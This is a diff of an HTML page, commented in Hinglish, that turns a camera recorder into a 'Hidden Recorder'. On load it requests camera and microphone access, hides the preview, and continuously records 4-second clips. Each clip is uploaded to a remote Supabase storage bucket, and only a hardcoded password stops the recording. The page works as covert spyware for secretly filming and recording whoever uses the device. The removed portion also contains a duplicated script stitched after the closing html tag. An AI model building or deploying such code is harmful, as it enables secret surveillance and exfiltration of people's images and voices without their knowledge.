@@ -2,257 +2,97 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Auto Video Recorder + Viewer</title>
+  <title>Hidden Recorder</title>
+  <script src="https://unpkg.com/@supabase/supabase-js"></script>
   <style>
-    body {
-      margin: 0;
-      height: 100vh;
-      background: #000;
-      color: white;
-      font-family: sans-serif;
-    }
-    #lock {
-      font-size: 32px;
-      cursor: pointer;
-      position: absolute;
-      top: 20px;
-      right: 20px;
-      color: white;
-    }
-    video#preview { display: none; } /* recording preview hidden */
-    .grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
-      gap: 15px;
-      margin: 20px;
-    }
-    .grid video {
-      width: 100%;
-      border-radius: 12px;
-      border: 2px solid white;
-    }
+    body { margin:0; background:black; height:100vh; overflow:hidden; }
+    #lock { position:absolute; top:10px; right:10px; color:white; font-size:24px; cursor:pointer; }
+    video { display:none; }
   </style>
 </head>
 <body>
-  <video id="preview" autoplay muted playsinline></video>
   <div id="lock">🔒</div>
-  <div id="videos" class="grid" style="display:none;"></div>
+  <video id="preview" autoplay muted playsinline></video>
 
-  <!-- Supabase SDK -->
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script>
-    // Supabase config
     const SUPABASE_URL = "https://eizhtvtchspiefxutzlg.supabase.co";
-    const SUPABASE_KEY = "PASTE_YOUR_ANON_KEY_HERE"; 
-    const BUCKET_NAME = "recordings"; 
-    const PASSWORD = "1234"; // apna password set karein
+    const SUPABASE_KEY = "YOUR-ANON-PUBLIC-KEY"; // <-- apna anon key paste karein
+    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-
-    const videoEl = document.getElementById("preview");
-    const lockEl = document.getElementById("lock");
-    const videosContainer = document.getElementById("videos");
-
-    let mediaRecorder, recordedChunks = [];
-    let stopEarly = false;
+    const BUCKET = "recordings";
+    const PASSWORD = "1234"; // <-- yahan apna password dal dein
+    let mediaRecorder, chunks = [];
+    let recording = true;
 
     async function startRecording() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }, 
-          audio: true
+          video: { facingMode: "user" }, audio: true
         });
-        videoEl.srcObject = stream;
+        document.getElementById("preview").srcObject = stream;
 
-        mediaRecorder = new MediaRecorder(stream);
-        mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
+        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
 
         mediaRecorder.onstop = async () => {
-          if (stopEarly) return; // agar unlock hua to upload mat karo
+          if (!recording) return; // agar lock laga to upload na ho
+          const blob = new Blob(chunks, { type: "video/webm" });
+          chunks = [];
 
-          const blob = new Blob(recordedChunks, { type: "video/webm" });
-          const filename = `video_${Date.now()}.webm`;
-
-          const { error } = await client.storage
-            .from(BUCKET_NAME)
-            .upload(filename, blob, {
-              contentType: "video/webm",
-              upsert: false
-            });
-
+          const fileName = `rec_${Date.now()}.webm`;
+          const { error } = await supabase.storage.from(BUCKET).upload(fileName, blob);
           if (error) {
-            console.error("Upload error:", error.message);
+            console.error("Upload failed:", error.message);
           } else {
-            console.log("✅ Uploaded:", filename);
-            await keepOnlyLatestFour();
+            console.log("✅ Uploaded:", fileName);
+            await cleanupOldFiles();
+          }
+
+          // next recording
+          if (recording) {
+            setTimeout(() => {
+              mediaRecorder.start();
+              setTimeout(() => mediaRecorder.stop(), 4000);
+            }, 100);
           }
         };
 
+        // start first recording
         mediaRecorder.start();
-        setTimeout(() => {
-          if (!stopEarly && mediaRecorder.state === "recording") {
-            mediaRecorder.stop();
-          }
-        }, 4000);
+        setTimeout(() => mediaRecorder.stop(), 4000);
+
       } catch (err) {
         console.error("Camera error:", err);
+        alert("⚠️ Camera/Mic permission allow karna zaroori hai.");
       }
     }
 
-    // Purani videos delete karna (sirf 4 rakhna)
-    async function keepOnlyLatestFour() {
-      const { data, error } = await client.storage
-        .from(BUCKET_NAME)
-        .list("", { sortBy: { column: "created_at", order: "desc" } });
-
-      if (error) {
-        console.error("List error:", error.message);
-        return;
-      }
-
-      if (data.length > 4) {
-        const oldFiles = data.slice(4).map(file => file.name);
-        await client.storage.from(BUCKET_NAME).remove(oldFiles);
-        console.log("🗑 Deleted old:", oldFiles);
-      }
-    }
-
-    // Videos load karna
-    async function loadVideos() {
-      const { data, error } = await client.storage
-        .from(BUCKET_NAME)
-        .list("", { sortBy: { column: "created_at", order: "desc" } });
-
-      if (error) {
-        console.error("Error listing:", error.message);
-        return;
-      }
-
-      videosContainer.innerHTML = "";
-      for (let file of data.slice(0, 4)) {
-        const { data: urlData } = client.storage.from(BUCKET_NAME).getPublicUrl(file.name);
-        const vid = document.createElement("video");
-        vid.src = urlData.publicUrl;
-        vid.controls = true;
-        videosContainer.appendChild(vid);
-      }
-    }
-
-    // Lock icon
-    lockEl.addEventListener("click", () => {
-      const input = prompt("Enter password:");
-      if (input === PASSWORD) {
-        stopEarly = true;
-        if (mediaRecorder && mediaRecorder.state === "recording") {
-          mediaRecorder.stop();
-        }
-        // show videos
-        videosContainer.style.display = "grid";
-        loadVideos();
-        alert("✅ Access granted. Recording stopped, showing videos.");
-      } else {
-        alert("❌ Wrong password! Recording will continue.");
-      }
-    });
-
-    // Start
-    startRecording();
-  </script>
-</body>
-</html>  <!-- Supabase JS SDK -->
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-  <script>
-    // 🔑 Apni Supabase details yahan dalen
-    const SUPABASE_URL = "https://eizhtvtchspiefxutzlg.supabase.co";
-    const SUPABASE_KEY = "PASTE_YOUR_ANON_KEY_HERE"; // Supabase project ke "API" section se
-    const BUCKET_NAME = "videos"; 
-    const PASSWORD = "1234"; // Apna password set karein
-
-    const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-
-    const videoEl = document.getElementById("preview");
-    const lockEl = document.getElementById("lock");
-
-    let mediaRecorder, recordedChunks = [];
-    let stopEarly = false;
-
-    async function startRecording() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }, 
-          audio: true
-        });
-        videoEl.srcObject = stream;
-
-        mediaRecorder = new MediaRecorder(stream);
-        mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
-
-        mediaRecorder.onstop = async () => {
-          if (stopEarly) return; // Agar lock se stop hua to upload na ho
-
-          const blob = new Blob(recordedChunks, { type: "video/webm" });
-          const filename = `video_${Date.now()}.webm`;
-
-          // Upload video
-          const { error } = await client.storage
-            .from(BUCKET_NAME)
-            .upload(filename, blob, {
-              contentType: "video/webm",
-              upsert: false
-            });
-
-          if (error) {
-            console.error("Upload error:", error.message);
-          } else {
-            console.log("✅ Uploaded:", filename);
-            await keepOnlyLatestFour();
-          }
-        };
-
-        mediaRecorder.start();
-        setTimeout(() => {
-          if (!stopEarly && mediaRecorder.state === "recording") {
-            mediaRecorder.stop();
-          }
-        }, 4000); // 4 seconds
-      } catch (err) {
-        console.error("Camera error:", err);
-      }
-    }
-
-    // Sirf latest 4 videos rakhna
-    async function keepOnlyLatestFour() {
-      const { data, error } = await client.storage
-        .from(BUCKET_NAME)
-        .list("", { sortBy: { column: "created_at", order: "desc" } });
-
-      if (error) {
-        console.error("List error:", error.message);
-        return;
-      }
-
-      if (data.length > 4) {
-        const oldFiles = data.slice(4).map(file => file.name);
-        await client.storage.from(BUCKET_NAME).remove(oldFiles);
-        console.log("🗑 Deleted old files:", oldFiles);
+    // Delete old files, keep only last 4
+    async function cleanupOldFiles() {
+      const { data, error } = await supabase.storage.from(BUCKET).list();
+      if (error || !data) return;
+      const files = data.sort((a, b) => b.name.localeCompare(a.name));
+      const old = files.slice(4); 
+      for (const f of old) {
+        await supabase.storage.from(BUCKET).remove([f.name]);
       }
     }
 
     // Lock button
-    lockEl.addEventListener("click", () => {
+    document.getElementById("lock").addEventListener("click", async () => {
       const input = prompt("Enter password:");
       if (input === PASSWORD) {
-        stopEarly = true;
-        if (mediaRecorder && mediaRecorder.state === "recording") {
+        recording = false;
+        if (mediaRecorder && mediaRecorder.state !== "inactive") {
           mediaRecorder.stop();
         }
-        alert("✅ Access granted. Recording stopped.");
+        alert("✅ Recording stopped!");
       } else {
-        alert("❌ Wrong password! Recording will continue.");
+        alert("❌ Wrong password!");
       }
     });
 
-    // Start recording automatically
+    // Start on load
     startRecording();
   </script>
 </body>
